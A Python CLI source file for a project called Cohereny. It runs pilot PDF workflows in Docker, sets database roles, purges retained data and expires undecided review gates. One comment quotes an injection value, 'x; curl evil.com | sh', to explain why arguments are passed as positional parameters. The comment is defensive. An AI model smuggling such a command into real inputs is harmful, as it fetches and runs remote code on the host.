"""
cli/main.py

Cohereny CLI — command line entry point for local operations.

Entry point: `cc` (via pyproject.toml project.scripts)

Subcommands:
  cc pilot run <pdf> --pilot <name>  → start a pilot workflow for a PDF
  cc pilot list [--pilot <name>]     → list available PDFs in the examples directory
  cc actor set-role <idp_sub> <role> → grant a role directly in the database
  cc retention purge [--dry-run]     → clear and delete run data past its period
  cc oversight expire [--dry-run]    → end or escalate gates nobody decided in time

Environment:
  PILOT_DATA_DIR    holds examples/ (input PDFs) and outputs/ (results);
                    default ./pilot-data in the current directory
  PILOT_SOURCE_DIR  parent of the pilot sources (study/, banking/);
                    default the pilots/ directory of this checkout
  DATABASE_URL      for `actor set-role`; read like the API reads it, from the
                    environment or .env (api/config.py)

Why a CLI alongside the REST API:
  Pilot workflows run locally on the host (direct access to the data
  directory and Docker volumes) and don't need an HTTP interface. The CLI wrapper starts
  the workflow container with the correct volume mounts without requiring
  the user to know the Docker commands.

Technically: starts a temporary Docker container (--rm) with the
cohereny-api:dev image. The container mounts the data directory for
input/output and the pilot code. pip install in the container ensures the latest pilot
version runs without a build step.

Called by:
  - an operator, manually on the host, for learning and analysis runs
  - (Future: additional pilot commands for other workflows)

Dependencies:
  - typer     (CLI framework)
  - docker    (must be installed on the executing system)
"""
import asyncio
import os
import re
import subprocess
from pathlib import Path
from typing import Optional

import typer

app = typer.Typer(name="cc", help="Cohereny CLI", no_args_is_help=True)
pilot_app = typer.Typer(help="Pilot workflow commands", no_args_is_help=True)
app.add_typer(pilot_app, name="pilot")

actor_app = typer.Typer(help="Actor and role administration", no_args_is_help=True)
app.add_typer(actor_app, name="actor")
retention_app = typer.Typer(help="Retention: apply the configured periods", no_args_is_help=True)
app.add_typer(retention_app, name="retention")
oversight_app = typer.Typer(help="Oversight: gates nobody decided", no_args_is_help=True)
app.add_typer(oversight_app, name="oversight")

# Both locations used to be hard-coded paths of one host. They are read per
# call rather than at import, so a changed environment (or a test) takes effect
# without reloading the module, and the defaults work in a fresh checkout.
_PILOT_NAMES = ("study", "banking")


def _data_dir() -> Path:
    """Directory with pilot inputs (examples/) and outputs (outputs/)."""
    return Path(os.environ.get("PILOT_DATA_DIR", "pilot-data")).resolve()


def _pilot_dirs() -> dict[str, Path]:
    """Pilot name → source directory on the host."""
    default = Path(__file__).resolve().parent.parent / "pilots"
    root = Path(os.environ.get("PILOT_SOURCE_DIR", default)).resolve()
    return {name: root / name for name in _PILOT_NAMES}

# Dev image contains all dependencies — no separate pilot image needed
_IMAGE = "cohereny-api:dev"

# Second line of defence for the thread ID: even though it is passed to bash as
# a positional parameter and never interpolated, reject anything that is not a
# plain identifier. Fails with a clear message instead of an obscure shell error.
_THREAD_ID_RE = re.compile(r"^[A-Za-z0-9._-]+$")


@pilot_app.command("run")
def pilot_run(
    pdf: str = typer.Argument(..., help="Filename in examples/ or absolute path"),
    pilot: str = typer.Option(
        "study",
        "--pilot", "-p",
        help="Pilot workflow to run: study or banking",
    ),
    thread_id: Optional[str] = typer.Option(
        None,
        "--thread-id", "-t",
        help="LangGraph thread ID (default: <pilot>-run-1)",
    ),
):
    """Start a pilot workflow for a PDF."""
    pilots = _pilot_dirs()
    data = _data_dir()
    if pilot not in pilots:
        typer.echo(f"Error: Unknown pilot '{pilot}'. Choose from: {', '.join(pilots)}", err=True)
        raise typer.Exit(1)

    if thread_id is None:
        thread_id = f"{pilot}-run-1"
    elif not _THREAD_ID_RE.match(thread_id):
        typer.echo(
            f"Error: Invalid thread ID '{thread_id}'. "
            "Allowed: letters, digits, dot, underscore, hyphen.",
            err=True,
        )
        raise typer.Exit(1)

    pilot_dir = pilots[pilot]
    pdf_path = Path(pdf)
    if not pdf_path.is_absolute():
        pdf_path = data / "examples" / pdf

    if not pdf_path.exists():
        typer.echo(f"Error: PDF not found: {pdf_path}", err=True)
        raise typer.Exit(1)

    # Pass the filename and thread ID as positional parameters rather than
    # interpolating them into the script. bash then treats them as data, so a
    # value like "x; curl evil.com | sh" cannot execute inside the container --
    # which matters because it runs with --network host and the .env mounted
    # (CHY-76). "_" occupies $0, so the arguments start at $1.
    inner = (
        "pip install /pilot --quiet 2>&1 | grep -v '^$' | grep -v notice && "
        'cd /pilot && python run.py "/data/$1" "$2"'
    )

    cmd = [
        "docker", "run", "--rm",
        "--network", "host",
        "-e", "PYTHONUNBUFFERED=1",
        "-v", f"{pilot_dir}:/pilot",
        "-v", f"{data}/outputs:/pilot/output",
        "-v", f"{data}/examples:/data",
        "--env-file", str(pilot_dir / ".env"),
        _IMAGE,
        "bash", "-c", inner, "_", pdf_path.name, thread_id,
    ]

    typer.echo(f"Pilot:     {pilot}")
    typer.echo(f"PDF:       {pdf_path.name}")
    typer.echo(f"Thread ID: {thread_id}")
    typer.echo(f"Output:    {data}/outputs/")
    typer.echo("")

    # B603 flags every subprocess call with a variable argument list, whether or
    # not injection is possible -- it points here rather than at the actual risk,
    # which was the interpolation into the bash script above (fixed in CHY-76).
    # This call is safe: cmd is a list (no shell), the script passed to bash -c
    # is static, and the untrusted values reach it as positional parameters that
    # bash treats as data. tests/test_cli_security.py verifies that barrier and
    # keeps a counter-test proving the old form did execute the payload.
    # The suppression must sit on the line directly above the finding.
    # nosemgrep: bandit.B603
    result = subprocess.run(cmd)
    raise typer.Exit(result.returncode)


@pilot_app.command("list")
def pilot_list(
    pilot: Optional[str] = typer.Option(
        None,
        "--pilot", "-p",
        help="Filter by pilot prefix: study or banking",
    ),
):
    """List available PDFs in the examples directory."""
    examples = _data_dir() / "examples"
    if not examples.exists():
        typer.echo(f"Directory not found: {examples}", err=True)
        raise typer.Exit(1)

    pdfs = sorted(examples.glob("*.pdf"))
    if not pdfs:
        typer.echo("No PDFs found.")
        return

    if pilot:
        pdfs = [p for p in pdfs if p.name.startswith(pilot)]
        if not pdfs:
            typer.echo(f"No PDFs found for pilot '{pilot}'.")
            return

    # Determine pilot from filename prefix for display
    def _detect_pilot(name: str) -> str:
        for p in _PILOT_NAMES:
            if name.startswith(p):
                return p
        return "?"

    col_w = max(len(p.name) for p in pdfs) + 2
    typer.echo(f"PDFs in {examples}:\n")
    typer.echo(f"  {'File':<{col_w}}  {'Pilot':<16}  Size")
    typer.echo(f"  {'-' * col_w}  {'-' * 16}  ------")
    for pdf in pdfs:
        size_mb = pdf.stat().st_size / 1_048_576
        detected = _detect_pilot(pdf.name)
        typer.echo(f"  {pdf.name:<{col_w}}  {detected:<16}  {size_mb:.1f} MB")


# ── Actor administration ──────────────────────────────────────────────────────
#
# Roles normally come from Authentik groups and are refreshed on every request
# (CHY-33, core/authz.py). This command exists for the two cases where that is
# not enough:
#
#   bootstrap  A fresh database has no admin. Whoever calls first is provisioned
#              at whatever their groups map to — and if the IdP sends no groups
#              claim at all, that is `consumer`, for everyone, forever.
#   recovery   The group mapping is wrong and the only person who could fix it
#              has just been demoted by it.
#
# It writes straight to the database and deliberately does not go through the
# API, because the API is what may be locked. A role set here is overwritten on
# the caller's next request if their token carries a groups claim — this is a
# way in, not a way around the mapping.


@actor_app.command("set-role")
def actor_set_role(
    idp_sub: str = typer.Argument(..., help="OIDC subject of the actor"),
    role: str = typer.Argument(..., help="admin | architect | reviewer | contributor | consumer"),
    database_url: Optional[str] = typer.Option(
        None, "--database-url", help="Overrides DATABASE_URL from the environment"
    ),
) -> None:
    """Set an actor's role directly in the database.

    Creates the actor if the subject is unknown, so it can bootstrap the first
    admin before anyone has ever called the API.

    The work is in kernel.identity.set_role since CHY-123: the kernel owns
    `actors` and `audit_log`, and this command held both an INSERT into each
    and its own copy of the five role names. What is left here is what exists
    because this is a CLI — argument parsing, the DSN, exit codes and the
    message a human reads.
    """
    # The same source as the API: the environment first, then .env in the
    # working directory, so README "Getting started" needs nothing extra.
    # Imported here for the start-up reason below.
    from api.config import settings

    dsn = database_url or settings.database_url

    # Imported here, not at module level: `cc` starts in 0.1 s because typer
    # and the standard library are all it loads. kernel.identity pulls asyncpg
    # and pydantic, and every other command would pay for it.
    from kernel import errors, identity, roles

    try:
        actor_id, created = asyncio.run(identity.set_role(dsn, idp_sub, role))
    except errors.UnknownRole as exc:
        typer.echo(f"{exc} Expected one of: {', '.join(sorted(roles.ROLE_NAMES))}")
        raise typer.Exit(code=2) from None
    except errors.ActorAnonymized as exc:
        typer.echo(str(exc))
        raise typer.Exit(code=1) from None

    what = "created" if created else "updated"
    typer.echo(f"{what}: actor {actor_id} ({idp_sub}) → {role}")


@retention_app.command("purge")
def retention_purge(
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Count what would go, change nothing, write no audit entry"
    ),
    database_url: str | None = typer.Option(
        None, "--database-url", help="Overrides DATABASE_URL from the environment"
    ),
) -> None:
    """Clear run content and delete run traces whose period has passed (ADR-046).

    Started by the operator's timer, not by the API. Each real run writes a
    `retention.purged` entry into the audit log, also when nothing expired —
    GET /v1/admin/retention reports the newest, and its age is what monitoring
    should watch. Periods are set through PUT /v1/admin/retention.
    """
    # Same sources and the same late imports as `actor set-role`.
    from api.config import settings
    from cli import retention

    counts = asyncio.run(retention.purge(database_url or settings.database_url,
                                         dry_run=dry_run))
    label = "would clear or delete" if dry_run else "cleared or deleted"
    typer.echo(f"retention purge — {label}:")
    for name, count in counts.items():
        typer.echo(f"  {name:28} {count}")


@oversight_app.command("expire")
def oversight_expire(
    dry_run: bool = typer.Option(
        False, "--dry-run", help="Count what would expire or escalate, change nothing"
    ),
    database_url: str | None = typer.Option(
        None, "--database-url", help="Overrides DATABASE_URL from the environment"
    ),
) -> None:
    """End or escalate the gates nobody decided in time (ADR-050).

    Past the content period of its scope a waiting run ends as `expired`; past
    a gate's own review_timeout it escalates (on_timeout = escalate) or expires
    (reject). Started by the operator's timer, with `cc retention purge`. A run
    past the content period loses its content in the same step. Each expiry and
    escalation is audited, without a person — none acted.
    """
    # Same sources and the same late imports as `retention purge`.
    from api.config import settings
    from cli import oversight

    counts = asyncio.run(oversight.expire(database_url or settings.database_url,
                                          dry_run=dry_run))
    label = "would expire or escalate" if dry_run else "expired or escalated"
    typer.echo(f"oversight expire — {label}:")
    for name, count in counts.items():
        typer.echo(f"  {name:28} {count}")
